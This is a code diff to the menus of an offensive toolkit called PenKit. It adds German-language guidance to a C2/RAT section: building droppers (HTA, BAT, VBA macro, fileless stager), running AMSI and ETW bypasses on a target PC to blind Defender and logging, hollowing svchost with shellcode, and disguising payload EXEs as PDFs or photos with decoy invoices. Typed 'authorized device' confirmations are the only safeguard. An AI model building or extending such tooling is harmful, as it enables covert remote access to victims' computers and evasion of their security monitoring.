@@ -35,25 +35,38 @@ def slow(text: str, delay: float = 0.018):
 def banner():
     clr()
     art = f"""
-{DG}    ██████╗ ███████╗███╗  ██╗██╗  ██╗██╗████████╗
-{G}    ██╔══██╗██╔════╝████╗ ██║██║ ██╔╝██║╚══██╔══╝
-{G}    ██████╔╝█████╗  ██╔██╗██║█████╔╝ ██║   ██║
-{G}    ██╔═══╝ ██╔══╝  ██║╚████║██╔═██╗ ██║   ██║
-{DG}    ██║     ███████╗██║ ╚███║██║  ██╗██║   ██║
-{DG}    ╚═╝     ╚══════╝╚═╝  ╚══╝╚═╝  ╚═╝╚═╝   ╚═╝{R}
-{DIM}              Authorized Pentesting Framework v3{R}
-{DIM}    ─────────────────────────────────────────────{R}"""
+{DG}  ██████╗ ███████╗███╗   ██╗██╗  ██╗██╗████████╗
+{G}  ██╔══██╗██╔════╝████╗  ██║██║ ██╔╝██║╚══██╔══╝
+{G}  ██████╔╝█████╗  ██╔██╗ ██║█████╔╝ ██║   ██║
+{G}  ██╔═══╝ ██╔══╝  ██║╚████║██╔═██╗ ██║   ██║
+{DG}  ██║     ███████╗██║ ╚███║██║  ██╗██║   ██║
+{DG}  ╚═╝     ╚══════╝╚═╝  ╚══╝╚═╝  ╚═╝╚═╝   ╚═╝{R}
+{DIM}             Authorized Pentesting Framework v3             {R}
+{DIM}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}
+"""
     print(art)
 
-def section(title: str):
-    w = 50
+def section(title: str, subtitle: str = ""):
+    w = 70
     print(f"\n{G}╔{'═'*(w-2)}╗{R}")
     print(f"{G}║{B}{title.center(w-2)}{R}{G}║{R}")
+    if subtitle:
+        print(f"{G}║{DIM}{subtitle.center(w-2)}{R}{G}║{R}")
     print(f"{G}╚{'═'*(w-2)}╝{R}\n")
 
-def menu_item(num: str, label: str, danger: str = ""):
+def info_box(lines: list[str]):
+    """Prints a dim info box — used to explain what a field means."""
+    w = 68
+    print(f"  {DIM}┌{'─'*(w-2)}┐{R}")
+    for line in lines:
+        padded = f"  {line}"
+        print(f"  {DIM}│{R}{DIM}{padded:<{w-2}}{R}{DIM}│{R}")
+    print(f"  {DIM}└{'─'*(w-2)}┘{R}")
+
+def menu_item(num: str, label: str, danger: str = "", hint: str = ""):
     color = {"🟢": DG, "🟡": Y, "🟠": Y, "🔴": RD, "⛔": RD}.get(danger, G)
-    print(f"  {DIM}[{R}{G}{B}{num}{R}{DIM}]{R}  {color}{label}{R}  {danger}")
+    hint_str = f"  {DIM}{hint}{R}" if hint else ""
+    print(f"  {DIM}[{R}{G}{B}{num:>2}{R}{DIM}]{R}  {color}{B}{label}{R}{hint_str}  {danger}")
 
 def prompt(text: str = "penkit") -> str:
     try:
@@ -609,16 +622,17 @@ async def menu_joker():
 
 async def menu_c2():
     banner()
-    section("💀  C2 / RAT — WINDOWS PAYLOADS")
-    print(f"  {RD}{B}⛔  AUTHORIZED USE ONLY — own/permitted devices only{R}")
+    section("💀  C2 / RAT — WINDOWS PAYLOADS", "Command & Control · AV Evasion · Reverse Shell")
+    print(f"  {RD}{B}⛔  NUR auf eigenen / autorisierten Geräten verwenden!{R}\n")
+
+    menu_item(" 1", "🔨  Full Payload Package bauen",     "⛔", "Erstellt PS1 + HTA + BAT + Macro + ANLEITUNG.txt")
+    menu_item(" 2", "🛡️   AMSI Bypass",                    "🔴", "Schaltet Windows Defender Scanning ab (PowerShell)")
+    menu_item(" 3", "👁️   ETW Bypass",                     "🔴", "Macht Windows Event-Logging blind")
+    menu_item(" 4", "🔀  AMSI + ETW kombiniert",           "🔴", "Beide Bypasses + ScriptBlock Logging in einem Befehl")
+    menu_item(" 5", "💉  Process Hollowing",               "⛔", "Shellcode in svchost.exe einschleusen (RAM only)")
+    menu_item(" 6", "🎭  Als PDF/Foto/Word tarnen",        "⛔", "EXE mit echtem Icon, öffnet Decoy-Datei zur Tarnung")
     print()
-    menu_item("1", "🔨  Build Full Payload Package",    "⛔")
-    menu_item("2", "🛡️   AMSI Bypass (standalone)",      "🔴")
-    menu_item("3", "👁️   ETW Bypass (blind Windows logs)","🔴")
-    menu_item("4", "🔀  Combined AMSI+ETW Bypass",      "🔴")
-    menu_item("5", "💉  Process Hollowing Payload",     "⛔")
-    menu_item("6", "🎭  Disguise as PDF/Photo/Word",    "⛔")
-    menu_item("0", "Back")
+    menu_item(" 0", "← Zurück", "")
     print()
 
     choice = prompt("c2")
@@ -626,24 +640,46 @@ async def menu_c2():
         return
 
     elif choice == "1":
-        # Full payload builder
         banner()
-        section("🔨  BUILD FULL PAYLOAD PACKAGE")
-        print(f"  {RD}⛔  30-second confirmation required.{R}")
+        section("🔨  FULL PAYLOAD PACKAGE", "Erstellt alle Delivery-Methoden + Schritt-für-Schritt ANLEITUNG")
+        info_box([
+            "Was wird gebaut:",
+            "  payload.ps1        — polymorphes PowerShell (AMSI+ETW bypass eingebaut)",
+            "  payload_hollow.ps1 — Process Hollowing Variante (läuft in svchost)",
+            "  dropper.hta        — Doppelklick-Datei → Payload startet sofort",
+            "  dropper.bat        — BAT-Datei für USB / freigegebene Ordner",
+            "  macro_template.vba — Word/Excel Macro (in VBA Editor einfügen)",
+            "  stager_url.ps1     — Fileless: lädt Payload in RAM, NICHTS auf Disk",
+            "  README_ANLEITUNG.txt — Komplette Schritt-für-Schritt Anleitung auf Deutsch",
+        ])
         print()
-        lhost = prompt("LHOST (your Kali IP)")
+        info_box([
+            "LHOST = deine Kali IP-Adresse (wo der Listener läuft)",
+            "  → Kali IP findest du mit: ip a | grep 192",
+            "  → Beispiel: 192.168.1.10",
+        ])
+        lhost = prompt("LHOST — deine Kali IP (z.B. 192.168.1.10)")
         if not lhost:
+            print(f"  {Y}[!] LHOST ist Pflicht.{R}")
+            wait_key()
             return
+        print()
+        info_box([
+            "LPORT = Port auf dem Kali lauscht (du kannst frei wählen)",
+            "  → Empfohlen: 443 (sieht aus wie HTTPS, wird selten blockiert)",
+            "  → Alternativ: 4444, 8443, 8080",
+            "  → Dieser Port muss in der Firewall offen sein: ufw allow <PORT>",
+        ])
         try:
-            lport = int(prompt("LPORT (e.g. 4444)") or "4444")
+            lport = int(prompt("LPORT — Listener-Port (default: 443)") or "443")
         except ValueError:
-            lport = 4444
+            lport = 443
 
-        # Danger confirmation
-        print(f"\n  {RD}{B}Type exactly: I confirm this is my authorized device{R}")
-        confirm = prompt("confirm")
+        print(f"\n  {RD}{B}⛔  SICHERHEITSABFRAGE{R}")
+        print(f"  {Y}Tippe exakt:{R}  {W}I confirm this is my authorized device{R}\n")
+        confirm = prompt("Bestätigung")
         if confirm.strip().lower() != "i confirm this is my authorized device":
-            print(f"  {Y}[!] Confirmation failed — aborted.{R}")
+            print(f"\n  {Y}[!] Falsche Eingabe — abgebrochen.{R}")
             wait_key()
             return
 
@@ -655,85 +691,164 @@ async def menu_c2():
             async for line in builder.build():
                 print_output_line(line)
         except Exception as e:
-            print(f"  {RD}[!] Error: {e}{R}")
+            print(f"  {RD}[!] Fehler: {e}{R}")
         wait_key()
 
     elif choice == "2":
         banner()
-        section("🛡️  AMSI BYPASS (standalone)")
-        method = prompt("Method [reflection/memory_patch] (default: reflection)") or "reflection"
+        section("🛡️  AMSI BYPASS", "Anti-Malware Scan Interface deaktivieren")
+        info_box([
+            "AMSI = Windows-Schnittstelle die PowerShell-Befehle an Defender weitergibt.",
+            "Dieser Bypass patcht AMSI im Speicher → Defender sieht den Code nicht mehr.",
+            "",
+            "Methoden:",
+            "  reflection    — ändert AMSI-Flag via .NET Reflection (sehr zuverlässig, default)",
+            "  memory_patch  — überschreibt AmsiScanBuffer direkt im RAM (noch stärker)",
+            "",
+            "Den generierten Befehl auf dem Ziel-PC in PowerShell ausführen.",
+        ])
+        print()
+        method = prompt("Methode [reflection / memory_patch]  (Enter = reflection)") or "reflection"
         try:
             from tools.c2.amsi_bypass import build_amsi_bypass
             cmd = build_amsi_bypass(method)
-            print(f"\n  {G}[+] Run this on the target Windows machine:{R}")
-            print(f"\n  {C}{cmd}{R}\n")
+            print(f"\n  {G}[+] Fertig! Diesen Befehl auf dem Ziel-PC ausführen:{R}\n")
+            print(f"  {C}{cmd}{R}\n")
+            print(f"  {DIM}Danach kannst du beliebigen PS-Code ohne Defender-Erkennung ausführen.{R}")
         except Exception as e:
             print(f"  {RD}[!] {e}{R}")
         wait_key()
 
     elif choice == "3":
         banner()
-        section("👁️  ETW BYPASS")
+        section("👁️  ETW BYPASS", "Windows Event Tracing abschalten")
+        info_box([
+            "ETW = Event Tracing for Windows — protokolliert ALLE PowerShell-Aktionen.",
+            "Dieser Bypass patcht EtwEventWrite in ntdll.dll → alle Logs blind.",
+            "Wirkung: EDR, SIEM und Windows Event Viewer sehen nichts mehr.",
+            "",
+            "Kein Input nötig — Befehl wird direkt generiert und angezeigt.",
+        ])
+        print()
         try:
             from tools.c2.amsi_bypass import build_etw_bypass
             cmd = build_etw_bypass()
-            print(f"\n  {G}[+] Patches EtwEventWrite → Windows logging blind{R}")
-            print(f"\n  {C}{cmd}{R}\n")
+            print(f"  {G}[+] Diesen Befehl auf dem Ziel-PC ausführen:{R}\n")
+            print(f"  {C}{cmd}{R}\n")
         except Exception as e:
             print(f"  {RD}[!] {e}{R}")
         wait_key()
 
     elif choice == "4":
         banner()
-        section("🔀  COMBINED AMSI+ETW BYPASS")
+        section("🔀  AMSI + ETW KOMBINIERT", "Alle Bypasses in einem einzigen Befehl")
+        info_box([
+            "Kombiniert in einem Base64-codierten PowerShell-Befehl:",
+            "  ✓  AMSI Bypass    → Defender sieht deinen Code nicht",
+            "  ✓  ETW Bypass     → Windows Logs blind",
+            "  ✓  ScriptBlock    → PS-Verlaufs-Logging deaktiviert",
+            "",
+            "Das ist der empfohlene erste Schritt vor jeder weiteren Aktion.",
+            "Kein Input nötig — direkt kopieren und auf Ziel ausführen.",
+        ])
+        print()
         try:
             from tools.c2.amsi_bypass import build_combined_bypass
             cmd = build_combined_bypass()
-            print(f"\n  {G}[+] Disables AMSI + ETW + ScriptBlock logging{R}")
-            print(f"\n  {C}{cmd}{R}\n")
+            print(f"  {G}[+] Alles-in-einem Bypass — auf Ziel ausführen:{R}\n")
+            print(f"  {C}{cmd}{R}\n")
         except Exception as e:
             print(f"  {RD}[!] {e}{R}")
         wait_key()
 
     elif choice == "5":
         banner()
-        section("💉  PROCESS HOLLOWING PAYLOAD")
-        lhost = prompt("LHOST (your Kali IP)")
+        section("💉  PROCESS HOLLOWING", "Shellcode in legitimen Windows-Prozess einschleusen")
+        info_box([
+            "Process Hollowing = Payload wird in svchost.exe / RuntimeBroker.exe injiziert.",
+            "Im Task-Manager sieht man nur einen normalen Windows-Prozess — kein Verdacht.",
+            "Der Shellcode läuft komplett im RAM — keine Datei auf der Festplatte.",
+            "",
+            "LHOST = deine Kali IP  (wo Metasploit lauscht)",
+            "LPORT = dein Listener-Port  (gleich wie im Metasploit handler)",
+            "",
+            "Wichtig: Demo-Shellcode (NOP sled) wird eingebaut.",
+            "Ersetze mit echtem msfvenom-Shellcode — steht in der ANLEITUNG.",
+        ])
+        print()
+        info_box([
+            "LHOST = deine Kali IP  →  ip a | grep 192",
+        ])
+        lhost = prompt("LHOST — Kali IP (z.B. 192.168.1.10)")
         if not lhost:
+            print(f"  {Y}[!] Pflichtfeld.{R}")
+            wait_key()
             return
+        info_box([
+            "LPORT = Port auf dem Metasploit lauscht  →  Empfohlen: 443",
+        ])
         try:
-            lport = int(prompt("LPORT") or "4444")
+            lport = int(prompt("LPORT (default: 443)") or "443")
         except ValueError:
-            lport = 4444
-        print(f"\n  {RD}⛔  Type: I own this device{R}")
-        if prompt("confirm").strip().lower() != "i own this device":
-            print(f"  {Y}[!] Aborted.{R}")
+            lport = 443
+        print(f"\n  {RD}⛔  Tippe:{R}  {W}I own this device{R}\n")
+        if prompt("Bestätigung").strip().lower() != "i own this device":
+            print(f"  {Y}[!] Abgebrochen.{R}")
             wait_key()
             return
         try:
             from tools.c2.process_hollow import generate as ph_gen, HOLLOW_TARGETS
             import random as _r
-            code = ph_gen(b"\x90" * 8, target_process=_r.choice(HOLLOW_TARGETS))
+            target = _r.choice(HOLLOW_TARGETS)
+            code = ph_gen(b"\x90" * 8, target_process=target)
             out = f"/tmp/hollow_{lhost.replace('.','_')}_{lport}.ps1"
             with open(out, "w") as f:
                 f.write(code)
-            print(f"\n  {G}[+] Saved: {out}{R}")
-            print(f"  {DIM}Replace demo shellcode with real msfvenom -f raw{R}")
+            print(f"\n  {G}[+] Gespeichert: {out}{R}")
+            print(f"  {C}[*] Ziel-Prozess: {target}{R}")
+            print(f"  {DIM}Nächster Schritt: echten Shellcode einbauen — siehe Full Package ANLEITUNG{R}")
         except Exception as e:
             print(f"  {RD}[!] {e}{R}")
         wait_key()
 
     elif choice == "6":
         banner()
-        section("🎭  DISGUISE AS PDF/PHOTO/WORD")
-        ps1_path = prompt("Path to payload.ps1")
+        section("🎭  PAYLOAD TARNEN", "Als PDF / Foto / Word-Datei verkleiden")
+        info_box([
+            "Erstellt eine EXE-Datei die aussieht wie eine PDF/Foto/Word-Datei:",
+            "  → Echtes Icon (PDF-Symbol, Foto-Symbol, Word-Symbol)",
+            "  → Öffnet gleichzeitig eine echte Decoy-Datei → kein Verdacht",
+            "  → Payload läuft versteckt im Hintergrund",
+            "",
+            "Benötigt: pyinstaller  →  pip3 install pyinstaller --break-system-packages",
+        ])
+        print()
+        info_box([
+            "payload.ps1 = die PS1-Datei die du mit Option 1 gebaut hast",
+            "  → Normalerweise in /tmp/penkit_c2_<ID>/payload.ps1",
+        ])
+        ps1_path = prompt("Pfad zur payload.ps1")
         if not ps1_path or not os.path.exists(ps1_path):
-            print(f"  {Y}[!] File not found.{R}")
+            print(f"  {Y}[!] Datei nicht gefunden: {ps1_path}{R}")
             wait_key()
             return
-        dtype = prompt("Disguise type [pdf/photo/word] (default: pdf)") or "pdf"
-        decoy = prompt("Path to real decoy file (optional, press Enter to skip)") or None
-        out_dir = prompt("Output directory (default: /tmp)") or "/tmp"
+        info_box([
+            "Tarnung wählen:",
+            "  pdf   → sieht aus wie ein PDF-Dokument  (Standard, sehr glaubwürdig)",
+            "  photo → sieht aus wie ein JPEG-Foto",
+            "  word  → sieht aus wie ein Word-Dokument (.docx)",
+        ])
+        dtype = prompt("Tarnung [pdf / photo / word]  (Enter = pdf)") or "pdf"
+        info_box([
+            "Decoy-Datei (optional): eine echte PDF/Foto die beim Doppelklick geöffnet wird.",
+            "  → Z.B. eine harmlose Rechnung, ein Urlaubsfoto, etc.",
+            "  → Leer lassen wenn keine Decoy-Datei vorhanden.",
+        ])
+        decoy = prompt("Pfad zur Decoy-Datei  (Enter = keine)") or None
+        if decoy and not os.path.exists(decoy):
+            print(f"  {Y}[!] Decoy nicht gefunden — wird ignoriert.{R}")
+            decoy = None
+        out_dir = prompt("Ausgabe-Ordner  (Enter = /tmp)") or "/tmp"
         print()
         try:
             from tools.c2.disguise import build_disguised_exe
@@ -772,18 +887,24 @@ async def main_menu():
 
     while True:
         banner()
-        print(f"  {DIM}{'─'*46}{R}")
-        menu_item("1", "📡  WiFi Attacks",           "🟠")
-        menu_item("2", "🌐  Network Intelligence",   "🟠")
-        menu_item("3", "💻  Web Attack",             "🟠")
-        menu_item("4", "🔑  Passwords & Hashes",     "🟡")
-        menu_item("5", "☠️   MITM",                   "🔴")
-        menu_item("6", "🔍  OSINT Recon",            "🟡")
-        menu_item("7", "🔵  Blue Team Defense",      "🟢")
-        menu_item("8", "🃏  Joker / Pranks",         "🟡")
-        menu_item("9", "💀  C2 / RAT Payloads",      "⛔")
-        print(f"  {DIM}{'─'*46}{R}")
-        menu_item("0", "Exit")
+        print(f"  {DIM}┌{'─'*66}┐{R}")
+        print(f"  {DIM}│{'  🔴  RED TEAM':^66}│{R}")
+        print(f"  {DIM}├{'─'*66}┤{R}")
+        menu_item(" 1", "📡  WiFi Attacks",          "🟠", "WPA2/3 crack, Evil Twin, PMKID, Deauth, Handshake")
+        menu_item(" 2", "🌐  Network Intelligence",  "🟠", "Nmap scan, CVE check, topology map, attack chain")
+        menu_item(" 3", "💻  Web Attack",            "🟠", "SQLmap, ffuf, nikto, XSS, LFI, BeEF")
+        menu_item(" 4", "🔑  Passwords & Hashes",   "🟡", "Hashcat GPU, John, Hydra brute-force, hash detect")
+        menu_item(" 5", "☠️   MITM",                  "🔴", "ARP spoof, SSL strip, Responder, DNS poison")
+        menu_item(" 6", "🔍  OSINT Recon",           "🟡", "Emails, subdomains, Sherlock 300+ platforms, report")
+        menu_item(" 9", "💀  C2 / RAT Payloads",     "⛔", "AMSI bypass, fileless shellcode, hollow, disguise")
+        print(f"  {DIM}├{'─'*66}┤{R}")
+        print(f"  {DIM}│{'  🔵  BLUE TEAM  /  🃏  JOKER':^66}│{R}")
+        print(f"  {DIM}├{'─'*66}┤{R}")
+        menu_item(" 7", "🔵  Blue Team Defense",     "🟢", "ARP watch, auth.log, honeypot, port monitor")
+        menu_item(" 8", "🃏  Joker / Pranks",        "🟡", "Fake BSOD, Kahoot bot, browser chaos, pranks")
+        print(f"  {DIM}└{'─'*66}┘{R}")
+        print()
+        menu_item(" 0", "❌  Exit", "")
 
         choice = prompt("penkit")
 
